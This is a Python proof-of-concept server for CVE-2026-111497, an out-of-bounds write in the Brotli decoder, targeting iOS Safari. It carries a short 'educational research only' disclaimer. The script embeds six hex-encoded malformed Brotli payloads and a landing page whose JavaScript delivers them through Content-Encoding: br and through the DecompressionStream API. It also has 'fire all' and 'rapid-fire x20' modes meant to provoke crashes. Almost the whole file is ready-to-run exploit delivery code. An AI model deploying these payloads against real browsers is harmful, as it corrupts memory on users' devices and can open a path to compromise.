#!/usr/bin/env python3
"""CVE-2026-111497 Brotli OOB Write — iOS Safari Trigger Server v2.

Educational research only — for testing on devices you own.

Two trigger mechanisms:
1. Content-Encoding: br (requires HTTPS for Safari to honor it)
2. DecompressionStream JS API (works over plain HTTP — no cert needed)

Usage:
    python3 brotli_trigger_server.py [port]
    # Then navigate iPad Safari to http://<mac-ip>:<port>/
"""

import http.server
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8889

# CVE-2026-111497: DecodeBlockTypeAndLength() returns BROTLI_FALSE for
# format error, indistinguishable from "need more input" on fast path.
# Decoder continues with stale Huffman state → OOB write on ring buffer.
PAYLOADS = {
    "oob-base":     bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000"),
    "oob-extended": bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
    "oob-huffman":  bytes.fromhex("200018414141fcffff07002228f00b60f7f41f000000"),
    "oob-padding":  bytes.fromhex("200010414141fcffff0f002228f00b60f7f41f000000"),
    "oob-large":    bytes.fromhex("390010414141fcffff07002228f00b60f7f41f000000"),
    "oob-repeat":   bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000")
                  + bytes.fromhex("fcffff07002228f00b60f7f41f000000"),
}

LANDING_PAGE = b"""\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2026-111497 Brotli Trigger v2</title>
<style>
* { box-sizing: border-box; }
body { font-family: -apple-system, system-ui, sans-serif; padding: 16px;
       background: #111; color: #eee; margin: 0; }
h1 { color: #f90; font-size: 1.2em; margin: 0 0 8px; }
h2 { color: #aaa; font-size: 0.95em; margin: 16px 0 8px; }
p { font-size: 0.85em; color: #999; margin: 4px 0; }
.status { margin: 6px 0; padding: 8px; border-radius: 6px;
          font-family: monospace; font-size: 0.8em; }
.pending { background: #333; }
.success { background: #1a3a1a; color: #6f6; }
.fail { background: #3a1a1a; color: #f66; }
.crash { background: #3a3a1a; color: #ff6; }
.info { background: #1a2a3a; color: #6af; }
button { background: #f90; color: #000; border: none; padding: 10px 16px;
         border-radius: 6px; font-size: 14px; cursor: pointer; margin: 3px; }
button:active { background: #c70; }
.btn-red { background: #f44; color: #fff; }
.btn-blue { background: #48f; color: #fff; }
.btn-purple { background: #84f; color: #fff; }
.btn-green { background: #4a4; color: #fff; }
#log { margin-top: 12px; font-family: monospace; font-size: 11px;
       white-space: pre-wrap; max-height: 250px; overflow-y: auto;
       background: #1a1a1a; padding: 8px; border-radius: 6px; }
.section { border: 1px solid #333; border-radius: 8px; padding: 12px;
           margin: 8px 0; }
</style>
</head>
<body>
<h1>CVE-2026-111497 Brotli OOB Write v2</h1>
<p>iOS Safari trigger &mdash; educational research on owned devices only.</p>

<div class="section">
<h2>Method 1: Content-Encoding: br</h2>
<p>Server returns malformed Brotli with Content-Encoding header.</p>
<div>
<button onclick="triggerCE('oob-base')">base</button>
<button onclick="triggerCE('oob-extended')">extended</button>
<button onclick="triggerCE('oob-huffman')">huffman</button>
<button onclick="triggerCE('oob-padding')">padding</button>
<button onclick="triggerCE('oob-large')">large-win</button>
<button onclick="triggerCE('oob-repeat')">repeat</button>
</div>
<button onclick="triggerAllCE()" class="btn-red" style="margin-top:6px">Fire ALL (CE)</button>
</div>

<div class="section">
<h2>Method 2: DecompressionStream API (HTTP safe)</h2>
<p>Fetches raw bytes and decompresses via JS. Works over plain HTTP.</p>
<div>
<button onclick="triggerDS('oob-base')" class="btn-blue">base</button>
<button onclick="triggerDS('oob-extended')" class="btn-blue">extended</button>
<button onclick="triggerDS('oob-huffman')" class="btn-blue">huffman</button>
<button onclick="triggerDS('oob-padding')" class="btn-blue">padding</button>
<button onclick="triggerDS('oob-large')" class="btn-blue">large-win</button>
<button onclick="triggerDS('oob-repeat')" class="btn-blue">repeat</button>
</div>
<button onclick="triggerAllDS()" class="btn-red" style="margin-top:6px">Fire ALL (DS)</button>
</div>

<div class="section">
<h2>Method 3: Rapid-fire (crash detection)</h2>
<p>Sends 20 rapid requests to increase chance of observable crash.</p>
<button onclick="rapidFire()" class="btn-purple">Rapid-fire x20</button>
<button onclick="checkAlive()" class="btn-green">Check if alive</button>
</div>

<div id="results"></div>
<div id="log"></div>

<script>
var results = {};
var logEl = document.getElementById('log');
var dsSupported = typeof DecompressionStream !== 'undefined';

function log(msg) {
  logEl.textContent += new Date().toISOString().slice(11,23) + ' ' + msg + '\\n';
  logEl.scrollTop = logEl.scrollHeight;
}

function showResult(name, status, detail) {
  results[name] = {status: status, detail: detail};
  var html = '';
  for (var k in results) {
    var r = results[k];
    var cls = r.status === 'pending' ? 'pending' :
              r.status === 'patched' ? 'success' :
              r.status === 'oob' ? 'fail' :
              r.status === 'info' ? 'info' : 'crash';
    html += '<div class="status ' + cls + '">' + k + ': ' + r.detail + '</div>';
  }
  document.getElementById('results').innerHTML = html;
}

function triggerCE(name) {
  showResult('CE:' + name, 'pending', 'fetching...');
  log('>>> CE:' + name);
  var t0 = performance.now();
  fetch('/trigger/' + name)
  .then(function(r) {
    var elapsed = (performance.now() - t0).toFixed(0);
    return r.arrayBuffer().then(function(buf) {
      var arr = new Uint8Array(buf);
      if (arr.length === 0) {
        showResult('CE:' + name, 'crash', 'EMPTY (' + elapsed + 'ms) - possible crash');
      } else {
        showResult('CE:' + name, 'info', arr.length + 'B in ' + elapsed + 'ms');
        log('  Got ' + arr.length + 'B');
      }
    });
  })
  .catch(function(e) {
    var elapsed = (performance.now() - t0).toFixed(0);
    showResult('CE:' + name, 'crash', 'ERROR (' + elapsed + 'ms): ' + e.message);
    log('  ERROR: ' + e.message);
  });
}

function triggerDS(name) {
  if (!dsSupported) {
    showResult('DS:' + name, 'info', 'DecompressionStream not available');
    return;
  }
  showResult('DS:' + name, 'pending', 'fetching raw bytes...');
  log('>>> DS:' + name + ' (DecompressionStream)');
  var t0 = performance.now();
  fetch('/raw/' + name)
  .then(function(r) {
    if (!r.ok) throw new Error('HTTP ' + r.status);
    return r.arrayBuffer();
  })
  .then(function(buf) {
    log('  Got ' + buf.byteLength + 'B raw, decompressing...');
    var ds = new DecompressionStream('br');
    var writer = ds.writable.getWriter();
    var reader = ds.readable.getReader();
    writer.write(new Uint8Array(buf));
    writer.close();
    var chunks = [];
    function readChunk() {
      return reader.read().then(function(result) {
        if (result.done) return chunks;
        chunks.push(result.value);
        return readChunk();
      });
    }
    return readChunk().then(function(chunks) {
      var totalLen = chunks.reduce(function(s, c) { return s + c.length; }, 0);
      var elapsed = (performance.now() - t0).toFixed(0);
      showResult('DS:' + name, 'oob', 'Decompressed ' + totalLen + 'B in ' + elapsed + 'ms - decoder processed malformed stream!');
      log('  DECOMPRESSED: ' + totalLen + 'B - decoder did NOT reject');
    });
  })
  .catch(function(e) {
    var elapsed = (performance.now() - t0).toFixed(0);
    if (e.message && (e.message.indexOf('format') >= 0 || e.message.indexOf('error') >= 0 || e.message.indexOf('corrupt') >= 0)) {
      showResult('DS:' + name, 'patched', 'PATCHED (' + elapsed + 'ms): ' + e.message);
      log('  PATCHED: decoder rejected stream');
    } else {
      showResult('DS:' + name, 'crash', 'ERROR (' + elapsed + 'ms): ' + e.message);
      log('  ERROR: ' + e.message);
    }
  });
}

function triggerAllCE() {
  log('=== Firing all CE payloads ===');
  ['oob-base','oob-extended','oob-huffman','oob-padding','oob-large','oob-repeat'].forEach(function(name, i) {
    setTimeout(function() { triggerCE(name); }, i * 300);
  });
}

function triggerAllDS() {
  log('=== Firing all DS payloads ===');
  ['oob-base','oob-extended','oob-huffman','oob-padding','oob-large','oob-repeat'].forEach(function(name, i) {
    setTimeout(function() { triggerDS(name); }, i * 300);
  });
}

function rapidFire() {
  log('=== Rapid-fire x20 ===');
  showResult('rapid', 'pending', 'sending 20 requests...');
  var done = 0, errors = 0, total = 20;
  for (var i = 0; i < total; i++) {
    (function(idx) {
      setTimeout(function() {
        fetch('/trigger/oob-base')
        .then(function(r) { return r.arrayBuffer(); })
        .then(function() { done++; update(); })
        .catch(function(e) { errors++; done++; update(); });
      }, idx * 50);
    })(i);
  }
  function update() {
    if (done >= total) {
      if (errors > 0) {
        showResult('rapid', 'crash', done + ' done, ' + errors + ' errors');
      } else {
        showResult('rapid', 'info', 'All ' + total + ' succeeded');
      }
    }
  }
}

function checkAlive() {
  showResult('alive', 'pending', 'checking...');
  fetch('/').then(function(r) {
    showResult('alive', 'success', 'Server responding');
  }).catch(function(e) {
    showResult('alive', 'crash', 'Server unreachable: ' + e.message);
  });
}

log('=== Browser Capabilities ===');
log('DecompressionStream: ' + (dsSupported ? 'YES' : 'NO'));
log('UserAgent: ' + navigator.userAgent);
log('Protocol: ' + location.protocol);
log('');
</script>
</body>
</html>
"""


class BrotliTriggerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(LANDING_PAGE)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(LANDING_PAGE)
            return

        if self.path.startswith('/trigger/'):
            name = self.path.split('/trigger/', 1)[1].split('?')[0]
            if name in PAYLOADS:
                payload = PAYLOADS[name]
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} -> CE /trigger/{name} "
                      f"({len(payload)}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Encoding', 'br')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        if self.path.startswith('/raw/'):
            name = self.path.split('/raw/', 1)[1].split('?')[0]
            if name in PAYLOADS:
                payload = PAYLOADS[name]
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} -> DS /raw/{name} "
                      f"({len(payload)}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(payload)
                return

        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'not found')

    def log_message(self, fmt, *args):
        pass


def main():
    server = http.server.HTTPServer(('0.0.0.0', PORT), BrotliTriggerHandler)
    print(f"CVE-2026-111497 Brotli Trigger Server v2")
    print(f"  Listening on 0.0.0.0:{PORT}")
    print(f"  Payloads: {', '.join(PAYLOADS.keys())}")
    print(f"  /trigger/<name> - Content-Encoding: br")
    print(f"  /raw/<name>     - Raw bytes for DecompressionStream")
    print(f"  Navigate iPad Safari to http://<mac-ip>:{PORT}/")
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == '__main__':
    main()
